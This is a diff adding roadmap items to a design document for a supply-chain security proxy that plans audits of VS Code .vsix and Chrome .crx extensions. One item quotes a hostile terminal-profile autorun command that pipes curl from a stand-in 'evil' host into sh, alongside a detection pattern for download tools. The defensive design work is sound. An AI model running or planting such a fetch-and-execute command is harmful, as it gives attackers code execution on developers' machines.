@@ -1282,6 +1282,122 @@ and lights up the most existing detection for free.
     write itself while the post-run diff catches sideloads that
     bypass the Marketplace fetch.
 
+25. **Bundled `node_modules` audit inside `.vsix`** *(priority:
+    high)* — a `.vsix` is effectively `npm pack` over the
+    extension's working tree, so the `extension/node_modules/`
+    subtree ships pre-resolved transitive deps that the Marketplace
+    integrity hash + MS signature attest to as a whole, but which
+    the npm-side defences (release-age fallback, typosquat oracle,
+    OSV scan, install inventory) never see — the deps don't touch
+    `registry.npmjs.org` from the user's machine. Extend
+    `sakimori_proxy::vsix_inspect::VsixInspection` with a
+    `bundled_dependencies: Vec<BundledDep { name, version }>` field
+    populated by walking every zip entry whose path matches
+    `extension/node_modules/**/package.json` (skip scoped-pkg
+    directories that don't carry a manifest, ignore nested
+    `node_modules/.bin`). Bounded: per-manifest cap reuses
+    `MAX_PACKAGE_JSON_BYTES`, total walk capped at
+    `MAX_BUNDLED_DEP_ENTRIES = 4096` so a pathological tree can't
+    stall the proxy. Fail-open per the existing inspector contract
+    (corrupt entry → skip, don't fabricate a denial). Wire-up: in
+    `proxy::handle_response`, after `lifecycle_inspect_vsix` parses
+    a `.vsix`, emit one `InstallEvent { Ecosystem::Npm, name,
+    version, ... }` per bundled dep with `execution_mode: unknown`
+    (the dep was *fetched* via the editor's marketplace path, not
+    via npm — calling it `persistent` would over-claim a lockfile
+    relationship that doesn't exist; `ephemeral` is also wrong).
+    Same `install_logger` + `otlp_exporter` + `hub_ingest_exporter`
+    fan-out the top-level vsix event uses. From there:
+    `sakimori advisories scan` already iterates the log and queries
+    OSV — bundled `lodash@4.17.20` inside a `.vsix` now lights up
+    the same way a top-level `lodash@4.17.20` install would. The
+    `KnownBadOracle` + typosquat oracle are consulted at emit time
+    so a bundled known-bad fails the `.vsix` outright under Block
+    mode (new deny header: `x-sakimori-deny: lifecycle-vsix-
+    bundled-known-bad`). Honest scope: this is **package-identity
+    audit only** — we don't re-hash the bundled tarball against
+    the public registry (Marketplace publishers legitimately patch
+    deps before bundling; that's not a smell). The signal is
+    "publisher bundled `<known-bad>@<bad-ver>`", not "the bundled
+    bytes diverge from npm's bytes". A future slice could opt in
+    to byte-identity verification per allow-listed package.
+
+26. **In-`.vsix` IOC content-needle scan** *(priority: high)* —
+    `sakimori-core::iocs::matches_content` already runs over
+    workspace files and editor-extension directories; the bundled
+    JS + JSON inside a freshly-fetched `.vsix` is exactly the same
+    threat surface but currently untouched. Walk the zip on the
+    same pass as #25 (single decode, two consumers), feed every
+    text-shaped entry (`*.js`, `*.mjs`, `*.cjs`, `*.json`, `*.ts`,
+    `*.sh`) through the existing catalog. Bounds: per-entry
+    `MAX_CONTENT_BYTES` from the iocs module, per-vsix
+    `MAX_SCANNED_ENTRIES = 2048` so a 50k-file extension can't
+    burn the proxy thread. The `VsixInspection` grows an
+    `ioc_hits: Vec<iocs::Finding>` field (path-prefixed with
+    `vsix:<publisher>.<name>@<version>/`); the proxy block path
+    treats any High-severity hit as a deny regardless of
+    `fires_on_startup`, with header
+    `x-sakimori-deny: lifecycle-vsix-ioc` and the matched rule id
+    in the body. Audit mode logs at warn. Reuses the same catalog
+    so a new needle landed for desktop installs (e.g. an emerging
+    exfil host) lights up `.vsix` payloads on the next proxy
+    restart with no separate update path. Pairs with #25: the
+    bundled-dep audit catches *which package* is malicious;
+    content-needle catches *what the JS does* when the package is
+    novel and not yet in OSV. Fail-open on decode errors. Out of
+    scope: deobfuscation, AST walking, regex pattern catalogs —
+    `ContentNeedle` is deliberately substring-only and that's the
+    right ceiling for the proxy hot path.
+
+27. **`settings.json` terminal-profile autorun rule** *(priority:
+    medium)* — the v2026.05.21 IOC catalog covers
+    `tasks.json:"runOn":"folderOpen"` but not the parallel VSCode
+    primitive: `terminal.integrated.profiles.<os>.<name>.args`
+    can carry a shell that opens a workspace-bound terminal and
+    immediately runs an attacker-supplied command (`bash -c
+    'curl evil | sh'`). The existing `ContentNeedle` rule kind
+    is too coarse (substring matches on `args` would false-positive
+    constantly on legitimate `bash --login` profiles). Needs a new
+    structural rule kind that parses `settings.json` (JSONC — strip
+    `//` comments and trailing commas), walks
+    `terminal.integrated.profiles.<os>` keys, and flags profiles
+    whose `args` contains a shell flag (`-c`, `/c`, `-Command`)
+    followed by a command longer than a configurable length, or
+    that references `curl|wget|iwr|Invoke-WebRequest`. Severity
+    Medium (legitimate but rare — devcontainers occasionally
+    legitimately bootstrap this way). Scope: workspace
+    `.vscode/settings.json` + `.cursor/settings.json`; user
+    settings are out of scope (out-of-tree, attribution is hazier).
+    Defer until #25/#26 land — the JSONC parser is a clean
+    standalone surface but the bundled-deps gap is a wider hole.
+
+28. **Chrome Web Store + `.crx` audit** *(priority: low)* —
+    completes roadmap #20's Chrome half. Two pieces, both gated
+    on out-of-band lookups because the update XML carries no
+    inline publish-time:
+    - **Chrome Web Store age oracle**: `ChromeWebStoreClient`
+      mirrors the `NugetFlatContainerClient` / `PypiSimpleClient`
+      pattern — fetch the detail page (or the unofficial JSON
+      endpoint) for a given extension id, parse the "Updated:"
+      timestamp, cache per-extension for 10 min. Feed the result
+      into a new `chrome_web_store` rewriter that filters the
+      update XML's `<updatecheck>` entries by age.
+    - **`.crx` audit**: Chrome packages are signed end-to-end
+      (CRX3 envelope = signed header + zip), so strip is
+      impossible by design. Implement audit/block only: parse the
+      CRX3 header to extract the extension id (sha256 of the
+      first public key, first 16 bytes hex-encoded a-p), open the
+      embedded zip, run the same manifest-v3 inspector
+      (`background.service_worker`, `permissions`, `host_permissions`).
+      Block-mode denial on
+      `host_permissions: ["<all_urls>"]` + a `<all_urls>`
+      content-script combination — the "extension can read every
+      page" shape. Same fail-open semantics. Defer: Chrome
+      extension installs on developer laptops are a smaller
+      population than VSCode extensions, and the absence of an
+      `npm pack`-style bundled-deps tree means there is no #25
+      analogue to chain.
+
 Explicitly **out of scope** (different product philosophy, not
 a missing feature):
 
